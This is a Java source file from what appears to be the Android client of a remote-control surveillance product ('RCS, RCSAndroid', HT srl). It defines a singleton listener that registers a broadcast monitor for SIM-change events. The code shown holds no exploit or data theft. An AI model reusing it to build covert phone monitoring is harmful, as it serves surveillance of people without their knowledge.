/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : ListenerSim.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.listener;

import com.ht.RCSAndroidGUI.Sim;

public class ListenerSim extends Listener<Sim> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerSim";

	private BroadcastMonitorSim simReceiver;

	/** The singleton. */
	private volatile static ListenerSim singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerSim self() {
		if (singleton == null) {
			synchronized (ListenerSim.class) {
				if (singleton == null) {
					singleton = new ListenerSim();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		registerSim();
	}

	@Override
	protected void stop() {
		simReceiver.unregister();
	}

	/**
	 * Register to Network Connection/Disconnection notification.
	 */
	private void registerSim() {
		simReceiver = new BroadcastMonitorSim();
		simReceiver.start();
		simReceiver.register();
	}
}
